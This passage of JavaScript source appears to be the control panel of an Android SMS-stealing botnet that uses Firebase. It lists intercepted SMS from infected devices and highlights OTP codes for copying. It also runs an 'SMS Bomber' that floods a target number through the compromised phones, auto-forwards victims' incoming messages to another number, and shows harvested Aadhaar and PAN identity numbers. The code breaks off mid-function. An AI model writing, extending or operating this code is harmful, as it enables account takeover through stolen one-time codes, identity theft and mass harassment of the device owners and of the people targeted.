    if (!data) data = state.localSmsCache;
    const showMuted = document.getElementById('showMutedSms')?.checked || false;
    const all = [];
    const seen = new Set();

    function addParsedMsg(devId, k, v) {
        if (!v || typeof v !== 'object') return;
        const timeVal = v.date || v.time || v.TimeandDate || v.created_at || 'Unknown';
        let parsedTs = 0;
        if (v.timestamp) {
            const n = Number(v.timestamp);
            if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
        }
        if (!parsedTs && v.created_at) {
            const n = Number(v.created_at);
            if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
        }
        if (!parsedTs && typeof timeVal === 'number' && timeVal > 0) {
            parsedTs = timeVal > 1e11 ? timeVal : timeVal * 1000;
        }
        if (!parsedTs) {
            parsedTs = decodeFirebasePushKey(k);
        }

        const sender = v.sender || v.number || v.phone || v.from || 'Unknown';
        const body = v.body || v.message || v.msg || v.content || v.text || '';
        if (!body && sender === 'Unknown') return;

        const effectiveDev = v.deviceId || v.device || v.targetDeviceId || v.phoneNumber || devId || 'Unknown Device';
        if (state.mutedDevices.has(effectiveDev) && !showMuted) return;

        // Deduplication
        const dedupKey = `${effectiveDev}__${sender}__${body}__${Math.floor(parsedTs / 1000)}`;
        if (seen.has(dedupKey)) return;
        seen.add(dedupKey);

        all.push({
            time: typeof timeVal === 'number' ? new Date(parsedTs || timeVal).toLocaleString() : (parsedTs ? new Date(parsedTs).toLocaleString() : timeVal),
            device: effectiveDev,
            sender: sender,
            body: body,
            ts: parsedTs,
            key: k
        });
    }

    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([topKey, item]) => {
            if (!item || typeof item !== 'object') return;

            // Direct SMS message object (Flat DB structure like Siyan)
            const isDirectMsg = (item.message !== undefined || item.body !== undefined || item.msg !== undefined || (item.sender !== undefined && (item.deviceId !== undefined || item.timestamp !== undefined)));

            if (isDirectMsg) {
                addParsedMsg(item.deviceId || topKey, topKey, item);
            } else {
                // Nested structure: item is a collection of messages under device topKey
                Object.entries(item).forEach(([k, v]) => {
                    if (v && typeof v === 'object') {
                        addParsedMsg(topKey, k, v);
                    }
                });
            }
        });
    }

    all.sort((a, b) => {
        const diff = (Number(b.ts) || 0) - (Number(a.ts) || 0);
        if (diff !== 0) return diff;
        if (b.key && a.key) return b.key.localeCompare(a.key);
        return 0;
    });

    state.globalSortedMsgs = all;
    state.smsPageIndex = 0;
    const countBadge = document.getElementById('smsCountBadge');
    if (countBadge) countBadge.textContent = all.length;
    renderSmsPage();
}

function renderSmsPage() {
    const list = document.getElementById('smsList');
    const empty = document.getElementById('smsEmpty');
    const pagination = document.getElementById('smsPagination');

    list.querySelectorAll('.sms-card').forEach(c => c.remove());
    state.smsKeyMap = {};

    let filtered = state.globalSortedMsgs || [];
    
    // Apply OTP filter
    if (state.smsFilter === 'otp') {
        filtered = filtered.filter(m => !!extractOtp(m.body));
    }

    // Apply Live Search filter
    if (state.smsSearchQuery) {
        const q = state.smsSearchQuery;
        filtered = filtered.filter(m => {
            const body = (m.body || '').toLowerCase();
            const sender = (m.sender || '').toLowerCase();
            const dev = (m.device || '').toLowerCase();
            const otp = (extractOtp(m.body) || '').toLowerCase();
            return body.includes(q) || sender.includes(q) || dev.includes(q) || otp.includes(q);
        });
    }

    const total = filtered.length;
    if (total === 0) {
        empty.style.display = 'flex';
        empty.innerHTML = `
            <div class="empty-planet-icon">📡</div>
            <p>${state.smsSearchQuery || state.smsFilter === 'otp' ? 'No Matching Intercepts Found' : 'No Space Transmissions Intercepted'}</p>
            <span>${state.smsSearchQuery ? 'Try clearing your search query or switching filters' : 'Tap "Stream Feed" to monitor incoming signals'}</span>
        `;
        pagination.style.display = 'none';
        return;
    }

    empty.style.display = 'none';
    pagination.style.display = 'flex';

    const pages = Math.ceil(total / state.smsPageSize);
    if (state.smsPageIndex >= pages) state.smsPageIndex = Math.max(0, pages - 1);

    const start = state.smsPageIndex * state.smsPageSize;
    const slice = filtered.slice(start, start + state.smsPageSize);

    const frag = document.createDocumentFragment();
    slice.forEach((m, i) => {
        const id = `sms_${start + i}`;
        const card = document.createElement('div');
        card.className = 'sms-card';
        card.id = id;

        const otp = extractOtp(m.body);
        const avatarLetter = (m.sender || 'S').replace(/[^a-zA-Z0-9]/g, '').charAt(0).toUpperCase() || '⚡';

        let otpHtml = '';
        if (otp) {
            otpHtml = `
                <div class="otp-highlight-box" onclick="copyOtp('${esc(otp)}', this.querySelector('.otp-copy-btn'), event)">
                    <div class="otp-label-wrap">
                        <span class="otp-tag">AUTHENTICATION OTP CODE</span>
                        <span class="otp-number">${esc(otp)}</span>
                    </div>
                    <button class="otp-copy-btn" onclick="copyOtp('${esc(otp)}', this, event)">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        <span>COPY OTP</span>
                    </button>
                </div>
            `;
        }

        card.innerHTML = `
            <div class="sms-card-top">
                <div class="sms-sender-wrap">
                    <div class="sms-sender-avatar">${avatarLetter}</div>
                    <span class="sms-card-sender">${esc(m.sender)}</span>
                </div>
                <span class="sms-card-time">${esc(String(m.time))}</span>
            </div>
            <div class="sms-card-device-pill">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/></svg>
                <span>${esc(m.device)}</span>
            </div>
            <div class="sms-card-body">${esc(m.body)}</div>
            ${otpHtml}
            <div class="sms-card-actions">
                <button class="sms-mini-btn" onclick="copyFullSms('${esc(m.body).replace(/'/g, "\\'")}', event)">
                    📋 Copy Text
                </button>
                <button class="sms-mini-btn" onclick="openSheet('${esc(m.device)}', 'Last sender: ${esc(m.sender)}')">
                    🛰️ Node Detail
                </button>
            </div>
        `;

        card.addEventListener('click', (e) => {
            if (e.target.closest('button') || e.target.closest('.otp-highlight-box')) return;
            list.querySelectorAll('.sms-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            openSheet(m.device, `Last sender: ${m.sender}`);
        });

        frag.appendChild(card);
        state.smsKeyMap[id] = { device: m.device, key: m.key };
    });

    list.appendChild(frag);
    document.getElementById('smsPageInfo').textContent = `${state.smsPageIndex + 1} / ${pages}`;
    document.getElementById('smsPrevBtn').disabled = state.smsPageIndex <= 0;
    document.getElementById('smsNextBtn').disabled = state.smsPageIndex >= pages - 1;
}

function prevSmsPage() {
    if (state.smsPageIndex > 0) {
        state.smsPageIndex--;
        renderSmsPage();
        document.getElementById('mainContent').scrollTop = 0;
    }
}

function nextSmsPage() {
    let filtered = state.globalSortedMsgs || [];
    if (state.smsFilter === 'otp') filtered = filtered.filter(m => !!extractOtp(m.body));
    if (state.smsSearchQuery) {
        const q = state.smsSearchQuery;
        filtered = filtered.filter(m => (m.body || '').toLowerCase().includes(q) || (m.sender || '').toLowerCase().includes(q) || (m.device || '').toLowerCase().includes(q));
    }
    const p = Math.ceil(filtered.length / state.smsPageSize);
    if (state.smsPageIndex < p - 1) {
        state.smsPageIndex++;
        renderSmsPage();
        document.getElementById('mainContent').scrollTop = 0;
    }
}

// ============================================
// TAB 3: SMS BOMBER
// ============================================

function setBomberMode(mode) {
    state.bomberMode = mode;
    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.mode === mode));
    
    if (mode === 'normal') {
        document.getElementById('bomberSettings').style.display = 'none';
        document.getElementById('normalSettings').style.display = 'block';
        document.getElementById('bomberLaunchBtn').innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> DISPATCH NORMAL MESSAGE ⚡`;
        
        const sel = document.getElementById('normalSenderSelect');
        if (sel) {
            if (sel.options.length <= 1) {
                if (state.devices.length === 0) {
                    fetchDevices().then(() => {
                        populateSenderDropdowns();
                        if (sel.options.length > 1) sel.selectedIndex = 1;
                    });
                } else {
                    populateSenderDropdowns();
                    if (sel.options.length > 1) sel.selectedIndex = 1;
                }
            } else if (!sel.value && sel.options.length > 1) {
                sel.selectedIndex = 1;
            }
        }
    } else {
        document.getElementById('bomberSettings').style.display = 'block';
        document.getElementById('normalSettings').style.display = 'none';
        document.getElementById('bomberLaunchBtn').innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg> LAUNCH SWARM DISPATCH ⚡💜`;
    }
}

function selectBomberSim(slot) {
    state.bomberSim = String(slot);
    document.querySelectorAll('#panelBomber .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

function adjustBomberCount(delta) {
    const input = document.getElementById('bomberCount');
    let val = parseInt(input.value) || 50;
    val = Math.max(1, Math.min(10000, val + delta));
    input.value = val;
}

function adjustBomberDelay(delta) {
    const input = document.getElementById('bomberDelay');
    let val = parseInt(input.value) || 200;
    val = Math.max(0, Math.min(10000, val + delta));
    input.value = val;
}

function updateBomberDeviceInfo() {
    const active = state.devices.filter(id => !state.mutedDevices.has(id));
    const el = document.getElementById('bomberDeviceInfo');
    if (el) el.textContent = `${active.length} devices available`;
}

function addBomberLog(num, deviceId, success, msg) {
    const log = document.getElementById('bomberLog');
    const empty = document.getElementById('bomberLogEmpty');
    if (empty) empty.style.display = 'none';

    const entry = document.createElement('div');
    entry.className = `log-entry ${success ? 'log-success' : 'log-fail'}`;
    entry.innerHTML = `
        <span class="log-num">#${num}</span>
        <span class="log-device">${esc(deviceId.substring(0, 16))}…</span>
        <span>${success ? '✓ Transmitted' : '✕ Lost'}</span>
    `;

    // Insert at top
    if (log.firstChild) log.insertBefore(entry, log.firstChild);
    else log.appendChild(entry);

    // Keep max 200 entries
    while (log.children.length > 200) log.removeChild(log.lastChild);
}

async function startBomber() {
    if (!FB_URL) return showToast('Please select a server first', 'info');
    if (state.bomberRunning) return;

    const targetInput = document.getElementById('bomberTarget');
    const messageInput = document.getElementById('bomberMessage');
    const target = targetInput.value.trim();
    const message = messageInput.value.trim();
    const count = parseInt(document.getElementById('bomberCount').value) || 50;
    const delay = parseInt(document.getElementById('bomberDelay').value) || 200;

    if (!target) return showToast('Please enter target phone number', 'warning');
    if (!message) return showToast('Please enter payload message', 'warning');

    // Ensure devices are loaded
    if (state.devices.length === 0) {
        setStatus('Loading nodes…', 'loading');
        await fetchDevices();
    }

    const activeDevices = state.devices.filter(id => !state.mutedDevices.has(id));
    if (activeDevices.length === 0) {
        return showToast('No active nodes available to dispatch', 'error');
    }

    const makeUniversalPayload = (devId) => {
        const simNum = parseInt(state.bomberSim) || 1;
        return {
            command: "send message",
            phoneNumber: target,
            messageText: message,
            message: message,
            msg: message,
            text: message,
            body: message,
            to: target,
            phone: target,
            simSlot: String(simNum),
            sim: simNum,
            from: simNum - 1,
            slot: String(simNum),
            targetDeviceId: devId,
            timestamp: Date.now(),
            isSended: false
        };
    };

    // Normal mode check
    if (state.bomberMode === 'normal') {
        const sel = document.getElementById('normalSenderSelect');
        let sender = sel ? sel.value : '';
        if (!sender) {
            if (activeDevices.length > 0) {
                sender = activeDevices[0];
                if (sel) sel.value = sender;
            } else {
                return showToast('Select a sender device', 'warning');
            }
        }
        
        setStatus('Dispatching…', 'loading');
        const launchBtn = document.getElementById('bomberLaunchBtn');
        if (launchBtn) launchBtn.disabled = true;

        if (sender === 'ALL') {
            let okCount = 0;
            let failCount = 0;

            const log = document.getElementById('bomberLog');
            if (log) log.querySelectorAll('.log-entry').forEach(e => e.remove());
            const empty = document.getElementById('bomberLogEmpty');
            if (empty) empty.style.display = 'none';

            const BATCH_SIZE = 15;
            for (let b = 0; b < activeDevices.length; b += BATCH_SIZE) {
                const batch = activeDevices.slice(b, b + BATCH_SIZE);
                setStatus(`Dispatching ${b}/${activeDevices.length}…`, 'loading');
                await Promise.allSettled(
                    batch.map(async (devId, idx) => {
                        const globalIdx = b + idx + 1;
                        const p = makeUniversalPayload(devId);
                        try {
                            const r = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
                                method: 'PATCH',
                                body: JSON.stringify(p),
                                headers: { 'Content-Type': 'application/json' },
                                signal: AbortSignal.timeout(6000)
                            });
                            if (r.ok) {
                                okCount++;
                                addBomberLog(globalIdx, devId, true, 'Sent Normal (ALL)');
                            } else {
                                failCount++;
                                addBomberLog(globalIdx, devId, false, 'Failed Normal (ALL)');
                            }
                        } catch (err) {
                            failCount++;
                            addBomberLog(globalIdx, devId, false, err.message || 'Error');
                        }
                    })
                );
            }
            showToast(`Done! Sent: ${okCount}, Failed: ${failCount}`, okCount > 0 ? 'success' : 'error');
        } else {
            // Single device mode
            try {
                const p = makeUniversalPayload(sender);
                const r = await fetch(`${FB_URL}/${DATA_PATH}/${sender}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify(p),
                    headers: { 'Content-Type': 'application/json' },
                    signal: AbortSignal.timeout(8000)
                });
                if (r.ok) {
                    showToast('Normal Message Dispatched Successfully! ⚡', 'success');
                    addBomberLog(1, sender, true, 'Sent via Normal Mode');
                } else {
                    showToast('Failed to dispatch message', 'error');
                    addBomberLog(1, sender, false, 'Failed via Normal Mode');
                }
            } catch (e) {
                showToast('Network error: ' + (e.message || 'Failed'), 'error');
                addBomberLog(1, sender, false, 'Network error');
            }
        }
        
        if (launchBtn) launchBtn.disabled = false;
        setStatus('Ready');
        return;
    }

    // Bomber mode logic
    if (activeDevices.length === 0) return showToast('No active devices. Fetch devices first.', 'error');

    state.bomberRunning = true;
    state.bomberAbort = false;

    // UI updates
    document.getElementById('bomberLaunchBtn').style.display = 'none';
    document.getElementById('bomberStopBtn').style.display = 'block';
    document.getElementById('bomberProgress').style.display = 'block';
    document.getElementById('bomberSentCount').textContent = '0';
    document.getElementById('bomberFailCount').textContent = '0';
    document.getElementById('bomberTotalCount').textContent = count;

    // Clear old log
    const log = document.getElementById('bomberLog');
    log.querySelectorAll('.log-entry').forEach(e => e.remove());
    const empty = document.getElementById('bomberLogEmpty');
    if (empty) empty.style.display = 'none';

    setStatus('Bombing…', 'loading');
    let sent = 0, failed = 0;

    // Fire in parallel batches of 20 for maximum speed
    const BOMB_BATCH = 20;
    for (let b = 0; b < count; b += BOMB_BATCH) {
        if (state.bomberAbort) break;

        const batchEnd = Math.min(b + BOMB_BATCH, count);
        const batchItems = [];
        for (let i = b; i < batchEnd; i++) {
            batchItems.push({ idx: i, devId: activeDevices[i % activeDevices.length] });
        }

        setStatus(`Bombing batch ${Math.floor(b / BOMB_BATCH) + 1}… (${b}/${count})`, 'loading');

        await Promise.allSettled(
            batchItems.map(item => {
                const payload = {
                    command: "send message",
                    phoneNumber: target,
                    messageText: message,
                    simSlot: state.bomberSim,
                    targetDeviceId: item.devId,
                };
                return fetch(`${FB_URL}/${DATA_PATH}/${item.devId}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify(payload),
                    headers: { 'Content-Type': 'application/json' },
                }).then(r => {
                    if (r.ok) { sent++; addBomberLog(item.idx + 1, item.devId, true); }
                    else { failed++; addBomberLog(item.idx + 1, item.devId, false); }
                }).catch(() => {
                    failed++;
                    addBomberLog(item.idx + 1, item.devId, false);
                });
            })
        );

        // Update counters after each batch
        document.getElementById('bomberSentCount').textContent = sent;
        document.getElementById('bomberFailCount').textContent = failed;

        const pct = Math.round((batchEnd / count) * 100);
        document.getElementById('bomberProgressText').textContent = `${batchEnd} / ${count}`;
        document.getElementById('bomberProgressPercent').textContent = `${pct}%`;
        document.getElementById('bomberProgressFill').style.width = `${pct}%`;

        // Tiny delay between batches only if user set delay > 0
        if (delay > 0 && batchEnd < count && !state.bomberAbort) {
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    // Done
    state.bomberRunning = false;
    document.getElementById('bomberLaunchBtn').style.display = 'flex';
    document.getElementById('bomberStopBtn').style.display = 'none';

    const aborted = state.bomberAbort;
    state.bomberAbort = false;
    setStatus(aborted ? 'Stopped' : 'Done');
    showToast(aborted ? `Stopped. Sent ${sent}/${count}` : `Done! Sent ${sent}, Failed ${failed}`, aborted ? 'warning' : 'success');
}

function stopBomber() {
    state.bomberAbort = true;
    showToast('Stopping…', 'warning');
}

// ============================================
// BOTTOM SHEET (Device Details)
// ============================================

async function openSheet(devId, extra = '') {
    state.currentSheetDevId = devId;
    state.sheetSmsAll = [];
    state.sheetPageIndex = 0;

    const sheet = document.getElementById('deviceSheet');
    sheet.classList.add('active');
    document.body.style.overflow = 'hidden';

    document.getElementById('sheetTitle').textContent = 'Device';
    document.getElementById('sheetDeviceId').textContent = devId;
    document.getElementById('sheetInfo').textContent = extra || 'Loading…';
    document.getElementById('sheetSmsList').innerHTML = '';
    document.getElementById('sheetSmsCount').textContent = '0';
    document.getElementById('sheetPagination').style.display = 'none';

    const detailEl = document.getElementById('sheetSmsDetail');
    if (detailEl) detailEl.style.display = 'none';
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }

    populateSenderDropdowns();

    // Fetch info
    try {
        const data = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`).then(r => r.json());
        if (data && typeof data === 'object') {
            const txt = Object.entries(data).filter(([k, v]) => typeof v !== 'object').map(([k, v]) => `${k}: ${v}`).join('\n');
            document.getElementById('sheetInfo').textContent = txt || 'No info';
        }
    } catch (e) {
        document.getElementById('sheetInfo').textContent = 'Failed to load';
    }

    if (state.sheetSmsInterval) clearInterval(state.sheetSmsInterval);
    state.sheetSmsInterval = setInterval(() => fetchSheetSms(devId, true), 5000);
    fetchSheetSms(devId);
}

function refreshSheetSms() {
    if (!state.currentSheetDevId) return;
    fetchSheetSms(state.currentSheetDevId, false);
}

async function fetchSheetSms(devId, silent = false) {
    if (!silent) setStatus('Fetching SMS...', 'loading');
    try {
        let msgs = [];
        const data = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`, { signal: AbortSignal.timeout(6000) })
            .then(r => r.json())
            .catch(() => null);

        if (data && typeof data === 'object') {
            Object.entries(data).forEach(([k, v]) => {
                if (!v || typeof v !== 'object') return;
                const timeVal = v.date || v.time || v.TimeandDate || v.created_at || 'Unknown';
                let parsedTs = 0;
                if (v.timestamp) {
                    const n = Number(v.timestamp);
                    if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
                }
                if (!parsedTs && v.created_at) {
                    const n = Number(v.created_at);
                    if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
                }
                if (!parsedTs && typeof timeVal === 'number' && timeVal > 0) {
                    parsedTs = timeVal > 1e11 ? timeVal : timeVal * 1000;
                }
                if (!parsedTs) {
                    parsedTs = decodeFirebasePushKey(k);
                }
                msgs.push({
                    time: typeof timeVal === 'number' ? new Date(parsedTs || timeVal).toLocaleString() : (parsedTs ? new Date(parsedTs).toLocaleString() : timeVal),
                    sender: v.sender || v.number || v.phone || v.from || 'Unknown',
                    body: v.body || v.message || v.msg || '',
                    ts: parsedTs,
                    key: k
                });
            });
        }

        // Fallback for flat databases (like Siyan): filter global messages for this devId
        if (msgs.length === 0 && state.globalSortedMsgs && state.globalSortedMsgs.length > 0) {
            msgs = state.globalSortedMsgs.filter(m => m.device === devId);
        }

        if (!silent) setStatus('Ready');
        msgs.sort((a, b) => {
            const diff = (Number(b.ts) || 0) - (Number(a.ts) || 0);
            if (diff !== 0) return diff;
            if (b.key && a.key) return b.key.localeCompare(a.key);
            return 0;
        });
        state.sheetSmsAll = msgs;
        state.sheetPageIndex = 0;
        const countEl = document.getElementById('sheetSmsCount');
        if (countEl) countEl.textContent = msgs.length;
        renderSheetSmsPage();
    } catch (e) {
        if (!silent) {
            setStatus('Error', 'error');
            showToast('Failed to fetch SMS', 'error');
        }
    }
}

function renderSheetSmsPage() {
    const list = document.getElementById('sheetSmsList');
    const pagination = document.getElementById('sheetPagination');
    list.innerHTML = '';

    const msgs = state.sheetSmsAll;
    const total = msgs.length;
    if (total === 0) { pagination.style.display = 'none'; return; }

    pagination.style.display = 'flex';
    const pages = Math.ceil(total / state.sheetPageSize);
    const start = state.sheetPageIndex * state.sheetPageSize;
    const slice = msgs.slice(start, start + state.sheetPageSize);

    slice.forEach(m => {
        const card = document.createElement('div');
        card.className = 'sms-card';
        
        const otp = extractOtp(m.body);
        let otpHtml = '';
        if (otp) {
            otpHtml = `
                <div class="otp-highlight-box" onclick="copyOtp('${esc(otp)}', this.querySelector('.otp-copy-btn'), event)">
                    <div class="otp-label-wrap">
                        <span class="otp-tag">AUTHENTICATION OTP CODE</span>
                        <span class="otp-number">${esc(otp)}</span>
                    </div>
                    <button class="otp-copy-btn" onclick="copyOtp('${esc(otp)}', this, event)">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        <span>COPY OTP</span>
                    </button>
                </div>
            `;
        }

        card.innerHTML = `
            <div class="sms-card-top">
                <span class="sms-card-sender">${esc(m.sender)}</span>
                <span class="sms-card-time">${esc(String(m.time))}</span>
            </div>
            <div class="sms-card-body">${esc(m.body)}</div>
            ${otpHtml}
            <div class="sms-card-actions">
                <button class="sms-mini-btn" onclick="copyFullSms('${esc(m.body).replace(/'/g, "\\'")}', event)">
                    📋 Copy Text
                </button>
            </div>
        `;
        card.addEventListener('click', (e) => {
            if (e.target.closest('button') || e.target.closest('.otp-highlight-box')) return;
            const detail = document.getElementById('sheetSmsDetail');
            detail.style.display = 'block';
            document.getElementById('sheetSmsDetailBody').textContent = m.body;
            list.querySelectorAll('.sms-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
        });
        list.appendChild(card);
    });

    document.getElementById('sheetPageInfo').textContent = `${state.sheetPageIndex + 1} / ${pages}`;
    document.getElementById('sheetSmsPrev').disabled = state.sheetPageIndex <= 0;
    document.getElementById('sheetSmsNext').disabled = state.sheetPageIndex >= pages - 1;
}

function sheetPrevPage() { if (state.sheetPageIndex > 0) { state.sheetPageIndex--; renderSheetSmsPage(); } }
function sheetNextPage() { const p = Math.ceil(state.sheetSmsAll.length / state.sheetPageSize); if (state.sheetPageIndex < p - 1) { state.sheetPageIndex++; renderSheetSmsPage(); } }

function closeSheet() {
    const devId = state.currentSheetDevId;
    if (devId && state.forwardIntervals[devId]) {
        clearInterval(state.forwardIntervals[devId]);
        state.forwardThreads[devId] = false;
        delete state.forwardIntervals[devId];
    }
    if (state.sheetSmsInterval) {
        clearInterval(state.sheetSmsInterval);
        state.sheetSmsInterval = null;
    }
    state.currentSheetDevId = null;
    document.getElementById('deviceSheet').classList.remove('active');
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }
    document.body.style.overflow = '';
}

// Close on overlay tap
document.addEventListener('click', (e) => {
    if (e.target.id === 'deviceSheet') closeSheet();
});

// ---- Send Single Message ----
async function sendSingleMessage() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    const phone = document.getElementById('sheetPhone').value.trim();
    const msg = document.getElementById('sheetMessage').value.trim();
    if (!phone || !msg) return showToast('Enter phone & message', 'warning');

    try {
        const simNum = parseInt(state.sheetSim) || 1;
        const p = {
            command: "send message",
            phoneNumber: phone,
            messageText: msg,
            message: msg,
            msg: msg,
            text: msg,
            body: msg,
            to: phone,
            phone: phone,
            simSlot: String(simNum),
            sim: simNum,
            from: simNum - 1,
            targetDeviceId: devId,
            timestamp: Date.now(),
            isSended: false
        };
        const r = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
            method: 'PATCH',
            body: JSON.stringify(p),
            headers: { 'Content-Type': 'application/json' },
            signal: AbortSignal.timeout(8000)
        });
        if (r.ok) showToast('Sent!', 'success');
    } catch (e) {
        showToast(e.message, 'error');
    }
}

// ---- Auto Forward ----
function toggleForward() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    const btn = document.getElementById('sheetFwdBtn');
    const statusEl = document.getElementById('sheetFwdStatus');

    if (state.forwardThreads[devId]) {
        state.forwardThreads[devId] = false;
        clearInterval(state.forwardIntervals[devId]);
        delete state.forwardIntervals[devId];
        btn.textContent = 'Start';
        btn.className = 'action-btn action-primary';
        statusEl.textContent = 'Stopped.';
        return;
    }

    const targetPhone = document.getElementById('sheetFwdPhone').value.trim();
    const senderDev = document.getElementById('sheetSenderDevice').value;
    if (!targetPhone || !senderDev) return showToast('Enter phone & select device', 'warning');

    state.forwardThreads[devId] = true;
    btn.textContent = 'Stop';
    btn.className = 'action-btn action-red';
    statusEl.textContent = 'Monitoring…';

    let seenKeys = new Set();
    fetch(`${FB_URL}/${SMS_PATH}/${devId}.json?shallow=true`).then(r => r.json()).then(d => { if (d) seenKeys = new Set(Object.keys(d)); }).catch(() => {});

    state.forwardIntervals[devId] = setInterval(async () => {
        if (!state.forwardThreads[devId]) { clearInterval(state.forwardIntervals[devId]); return; }
        try {
            const data = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json());
            if (!data) return;
            for (const [k, v] of Object.entries(data)) {
                if (seenKeys.has(k)) continue;
                seenKeys.add(k);
                if (!v || typeof v !== 'object') continue;
                const body = v.body || v.message || v.msg || '';
                try {
                    await fetch(`${FB_URL}/${DATA_PATH}/${senderDev}.json`, {
                        method: 'PATCH',
                        body: JSON.stringify({ command: "send message", phoneNumber: targetPhone, messageText: body, simSlot: "1", targetDeviceId: senderDev }),
                        headers: { 'Content-Type': 'application/json' },
                    });
                    statusEl.textContent = `Forwarded → ${targetPhone}`;
                } catch (e) {}
            }
        } catch (e) {}
    }, 500);
}

// ---- Utility ----
function esc(text) {
    const d = document.createElement('div');
    d.textContent = text;
    return d.innerHTML;
}


// ---- Pages Data Logic ----
async function fetchPagesData() {
    if (!FB_URL) return showToast('Select a server first', 'error');
    const pagesList = document.getElementById('pagesList');
    setStatus('Fetching Pages...', 'loading');
    
    try {
        const pagesToFetch = ['page2'];
        let html = '';
        
        for (const page of pagesToFetch) {
            const r = await fetch(`${FB_URL}/${page}.json`);
            const data = await r.json();
            
            if (data && Object.keys(data).length > 0) {
                for (const [id, info] of Object.entries(data)) {
                    if (page === 'page2') {
                        // Special Page 2 Card with Aadhar/PAN logic
                        // Swap Aadhar and PAN mapping as requested
                        let aadhar = info.pan || info.Pan || info.PAN || 'N/A';
                        let pan = info.aadhar || info.Aadhar || info.AADHAR || 'N/A';
                        
                        html += `
                        <div class="citizen-card" onclick="openSheet('${id}')">
                            <div class="citizen-header">
                                <span class="citizen-id-badge">ID: ${esc(id)}</span>
                                <span class="server-status-pill online">REGISTRY RECORD</span>
                            </div>
                            
                            <div class="citizen-row">
                                <div class="citizen-label">
                                    <span>🪪</span>
                                    <span>AADHAAR NUMBER</span>
                                </div>
                                <div style="display:flex; align-items:center; gap:8px;">
                                    <span class="citizen-value">${esc(String(aadhar))}</span>
                                    ${aadhar !== 'N/A' ? `<button class="copy-mini-btn" onclick="event.stopPropagation(); copyTextToClipboard('${esc(String(aadhar))}', 'Aadhaar')">Copy</button>` : ''}
                                </div>
                            </div>
                            
                            <div class="citizen-row">
                                <div class="citizen-label">
                                    <span>💳</span>
                                    <span>PAN CARD</span>
                                </div>
                                <div style="display:flex; align-items:center; gap:8px;">
                                    <span class="citizen-value" style="color:var(--accent-light);">${esc(String(pan))}</span>
                                    ${pan !== 'N/A' ? `<button class="copy-mini-btn" onclick="event.stopPropagation(); copyTextToClipboard('${esc(String(pan))}', 'PAN')">Copy</button>` : ''}
                                </div>
                            </div>
                        </div>`;
                    } else {
                        // Standard Rendering for other pages
                        html += `<div style="background:var(--space-card); padding:14px; border:1px solid var(--orbit-border); border-radius:12px; margin-bottom:10px;">
                            <strong style="color:var(--orbit-accent); font-size:0.88rem; display:block; margin-bottom:8px; font-family:'Share Tech Mono', monospace;">PROBE ID: ${id}</strong>`;
                        for (const [k, v] of Object.entries(info)) {
                            html += `<div style="display:flex; justify-content:space-between; font-size:0.82rem; padding:4px 0; border-bottom:1px dashed rgba(0,136,255,0.25);">
                                <span style="color:var(--text-2); text-transform:capitalize;">${k}</span>
                                <span style="color:#38bdf8; font-family:'Share Tech Mono', monospace; font-weight:bold;">${esc(String(v))}</span>
                            </div>`;
                        }
                        html += `</div>`;
                    }
                }
            }
        }
        
        if (html === '') {
            html = `<div class="empty-state" style="padding:30px 0;"><p>No Data Available</p></div>`;
        }
        
        pagesList.innerHTML = html;
        setStatus('Pages Loaded');
        showToast('Pages data updated', 'success');
        
    } catch (e) {
        setStatus('Error fetching pages', 'error');
        showToast('Error: ' + e.message, 'error');
    }
}


// ---- Fetch Device More Details ----
async function fetchDeviceMoreDetails() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    moreDetailsEl.style.display = 'block';
    moreDetailsEl.innerHTML = '<div style="color:var(--sub); text-align:center;">Fetching details...</div>';
    
    try {
        const pagesToFetch = ['page2'];
        let html = '';
        
        for (const page of pagesToFetch) {
            const r = await fetch(`${FB_URL}/${page}/${devId}.json`);
            const data = await r.json();
            
            if (data && Object.keys(data).length > 0 && typeof data === 'object') {
                html += `<div style="margin-bottom: 10px;">
